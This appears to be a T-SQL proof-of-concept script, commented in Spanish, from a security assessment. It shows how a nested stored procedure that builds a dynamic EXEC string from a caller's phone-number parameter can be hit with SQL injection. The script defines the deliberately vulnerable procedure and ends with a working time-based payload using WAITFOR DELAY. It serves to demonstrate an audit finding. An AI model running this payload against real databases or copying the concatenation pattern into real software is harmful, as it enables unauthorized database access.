-- Para esta poc se toca el tema de que se usa un procedimiento dentro de otro procedimiento,
-- En injeccion es bastante similar al T7, pero se hara lo mas similar posible para ejemplificar que realmente puede haber una vulnerabilidad
-- Sin embargo su complejidad de explotación puede ser de muy alto nivel para alguien que no sea insider, a menos que encuentre prodecimientos o x,
-- Que le permitan enumerar como T7, sin embargo dependiendo de la naturaleza de la db, este podria ser muy lento teniendo que recurrir a out-band, blind, o time-based

--Problematicas, ejecutar sql injecction sin romper el exec del procedimiento inicial, se puede inferir la necesidad de tener los nombres de paramatros para el
--Procedimiento


-- Para esta poc se toca el tema de que se usa un procedimiento dentro de otro procedimiento,
-- En injeccion es bastante similar al T7, pero se hara lo mas similar posible para ejemplificar que realmente puede haber una vulnerabilidad
-- Sin embargo su complejidad de explotación puede ser de muy alto nivel para alguien que no sea insider, a menos que encuentre prodecimientos o x,
-- Que le permitan enumerar como T7, sin embargo dependiendo de la naturaleza de la db, este podria ser muy lento teniendo que recurrir a out-band, blind, o time-based

--Problematicas, ejecutar sql injecction sin romper el exec del procedimiento inicial, se puede inferir la necesidad de tener los nombres de paramatros para el
--Procedimiento

USE PoCs;
GO
CREATE PROCEDURE dbo.procedimientoX
(
    @p_Id int  = 1,           
    @p_Nombres VARCHAR(100) = 'Nombres',
    @p_Apellidos VARCHAR(100) = 'Apellidos',
    @p_Email VARCHAR(150) = 'Email',
    @p_Telefono VARCHAR(30)  = 'Telefono',
    @p_Pais VARCHAR(60) = 'Pais',
    @p_FechaRegistro VARCHAR(30)  = 'FechaRegistro',
    @p_Comentario VARCHAR(200) = 'Comentario'
)
AS
BEGIN
    SET NOCOUNT ON;

SELECT
  CONCAT(
      @p_Id,
      @p_Nombres,
      @p_Apellidos,
      @p_Email,
      @p_Telefono,
      @p_Pais,
      @p_FechaRegistro,
      @p_Comentario
  ) AS [Non - Stop Columnas];

END;
GO


CREATE PROCEDURE dbo.procedimientoY
(
    @p_Telefono VARCHAR(500) = 'Telefono'
)
AS
BEGIN
    DECLARE @Id int  = 1;       
    DECLARE @Nombres VARCHAR(100) = 'pARAMEtro';
    DECLARE @Apellidos VARCHAR(100) = 'Apellidos';
    DECLARE @Email VARCHAR(150) = 'Email';
    DECLARE @Pais VARCHAR(60)  = 'Pais';
    DECLARE @FechaRegistro VARCHAR(30)  = 'FechaRegistro';
    DECLARE @Comentario VARCHAR(200) = 'Comentario';

    DECLARE @QUERY VARCHAR(MAX) = '';

    SET @QUERY  = 'EXEC dbo.procedimientoX ';
    SET @QUERY += '@p_Id='        + CAST(@Id AS VARCHAR) + ', ';
    SET @QUERY += '@p_Nombres='   + @Nombres + ', ';
    SET @QUERY += '@p_Apellidos=' + @Apellidos + ', ';
    SET @QUERY += '@p_Email='     + @Email + ', ';
    SET @QUERY += '@p_Telefono='  + @p_Telefono + ', '; --Param
    SET @QUERY += '@p_Pais='      + @Pais + ', ';
    SET @QUERY += '@p_FechaRegistro=' + @FechaRegistro + ', ';
    SET @QUERY += '@p_Comentario='    + @Comentario + ';';

    PRINT @QUERY;  -- Debug
    EXEC(@QUERY);  -- InjeccionExec

END
GO


--PoC para BAM, simulando como fue definido el T8
DECLARE @payload VARCHAR(MAX) = 
    '''Telefono'',@p_Pais=''pais'',@p_FechaRegistro=''2025-10-21'',@p_Comentario=''October3'';WAITFOR DELAY ''00:00:10'';--';

PRINT @payload;
EXEC dbo.procedimientoY @p_Telefono = @payload;
